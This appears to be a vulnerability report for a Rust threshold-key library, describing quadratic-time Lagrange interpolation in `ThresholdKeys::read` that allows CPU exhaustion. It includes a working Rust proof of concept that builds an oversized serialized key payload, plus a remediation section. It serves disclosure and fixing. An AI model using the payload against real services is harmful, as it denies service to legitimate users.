### Title
Quadratic Lagrange interpolation in `ThresholdKeys::read` enables CPU exhaustion - (File: crypto/dkg/src/lib.rs)

### Summary
`ThresholdKeys::read` accepts attacker-controlled `t` and `n` values up to `u16::MAX`, reads `n` verification shares, and then calls `ThresholdKeys::new` without imposing a practical threshold bound. [1](#0-0)  With Lagrange interpolation, `ThresholdKeys::new` computes an interpolation factor for each of `t` participants, and each factor loops over all `t` participants, producing `O(t²)` field operations. [2](#0-1) [3](#0-2) 

### Finding Description
The serialized format stores `t`, `n`, and the participant index as three unsigned 16-bit values. [4](#0-3)  `ThresholdParams::new` only requires nonzero parameters, `t <= n`, and `i <= n`, so `t = n = 65535` is accepted. [5](#0-4) 

After selecting Lagrange interpolation, deserialization reads one scalar and `n` canonical group elements, then immediately constructs `ThresholdKeys`. [6](#0-5)  During construction, `group_key` evaluates `interpolation_factor` once for every participant in `1 ..= t`. [3](#0-2)  For Lagrange interpolation, every evaluation iterates over every included participant and performs field multiplication, subtraction, and a final inversion. [7](#0-6) 

Consequently, a syntactically valid serialized key containing approximately 2.2 MB of repeated secp256k1 generator encodings causes roughly `65535² = 4,294,836,225` inner-loop iterations before `ThresholdKeys::read` returns. [8](#0-7) [9](#0-8) 

### Impact Explanation
An unprivileged party able to submit serialized `ThresholdKeys` can consume disproportionate CPU resources using a small public input. [10](#0-9)  Repeated submissions can starve the processing thread or service, preventing legitimate key loading, signing, verification, or dependent protocol work from completing. [3](#0-2) 

The verification shares do not need to correspond to a valid distributed key-generation transcript because deserialization accepts arbitrary canonical points keyed only by participant index. [8](#0-7)  The expensive computation occurs inside construction and is reached before any caller can establish that the supplied key material is authorized or meaningful. [11](#0-10) 

### Likelihood Explanation
The attack requires only control of bytes passed to the public `ThresholdKeys::read` API. [12](#0-11)  The serialized payload can reuse one valid generator encoding for every participant because duplicate point values are not rejected; only participant-index bounds are checked. [13](#0-12) [14](#0-13) 

Canonical point decoding makes repeated compressed generator bytes valid input. [15](#0-14)  For secp256k1, the curve identifier is `b"secp256k1"` and the compressed generator encoding is 33 bytes. [9](#0-8) 

### Recommendation
Reject practical-but-invalid threshold sizes before interpolation, such as by enforcing a protocol-level maximum on `t` and `n` in `ThresholdKeys::read` or `ThresholdParams::new`. [1](#0-0)  For larger groups, replace the independent Lagrange-factor evaluations with an algorithm that computes all included coefficients in aggregate subquadratic time, or compute the group key with a single multiexponentiation over precomputed coefficients. [2](#0-1) [3](#0-2) 

### Proof of Concept
The following constructs a valid serialized secp256k1 `ThresholdKeys` value with `t = n = 65535`, Lagrange interpolation, a scalar secret share of one, and the generator repeated as every verification share. [16](#0-15) [17](#0-16) 

```rust
use ciphersuite::{
  Ciphersuite,
  group::{ff::PrimeField, GroupEncoding},
};
use frost::curve::Secp256k1;
use dkg::ThresholdKeys;

fn main() {
    const N: u16 = u16::MAX;

    let mut payload = Vec::new();

    // Curve ID length and ID.
    payload.extend_from_slice(
        &u32::try_from(<Secp256k1 as Ciphersuite>::ID.len())
            .unwrap()
            .to_le_bytes(),
    );
    payload.extend_from_slice(<Secp256k1 as Ciphersuite>::ID);

    // t, n, i.
    payload.extend_from_slice(&N.to_le_bytes());
    payload.extend_from_slice(&N.to_le_bytes());
    payload.extend_from_slice(&1u16.to_le_bytes());

    // Interpolation::Lagrange.
    payload.push(1);

    // Secret share: scalar one.
    payload.extend_from_slice(
        <Secp256k1 as Ciphersuite>::F::ONE.to_repr().as_ref(),
    );

    // n verification shares, all valid canonical compressed points.
    let generator = Secp256k1::generator().to_bytes();
    for _ in 0 .. N {
        payload.extend_from_slice(generator.as_ref());
    }

    // This enters ThresholdKeys::new and performs roughly N^2 Lagrange
    // field operations while deriving group_key.
    let _ = ThresholdKeys::<Secp256k1>::read(&mut payload.as_slice());
}
```

  fn interpolation_factor(&self, i: Participant, included: &[Participant]) -> F {
    match self {
      Interpolation::Constant(c) => c[usize::from(u16::from(i) - 1)],
      Interpolation::Lagrange => {
        let i_f = F::from(u64::from(u16::from(i)));

        let mut num = F::ONE;
        let mut denom = F::ONE;
        for l in included {
          if i == *l {
            continue;
          }

          let share = F::from(u64::from(u16::from(*l)));
          num *= share;
          denom *= share - i_f;
        }

        // Safe as this will only be 0 if we're part of the above loop
        // (which we have an if case to avoid)
        num * denom.invert().unwrap()
      }
